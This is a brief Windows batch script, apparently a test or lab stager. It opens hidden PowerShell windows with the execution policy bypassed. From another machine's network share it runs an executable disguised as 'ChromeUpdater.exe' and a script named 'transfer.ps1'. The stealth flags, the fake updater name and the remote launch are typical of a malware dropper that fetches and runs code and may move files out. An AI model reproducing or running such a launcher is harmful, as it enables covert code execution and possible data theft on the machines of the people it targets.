@ECHO OFF

cd %userprofile%\AppData\Local\Temp
start Powershell -windowstyle hidden -ExecutionPolicy Bypass Start-Process '\\JACKH-LAPTOP\Users\JackH\Documents\Test\ChromeUpdater.exe';
start Powershell -windowstyle hidden -ExecutionPolicy Bypass -File '\\JACKH-LAPTOP\Users\JackH\Documents\Test\transfer.ps1';
:: "C:\Users\JackH\Documents\Test\ChromeUpdater.exe"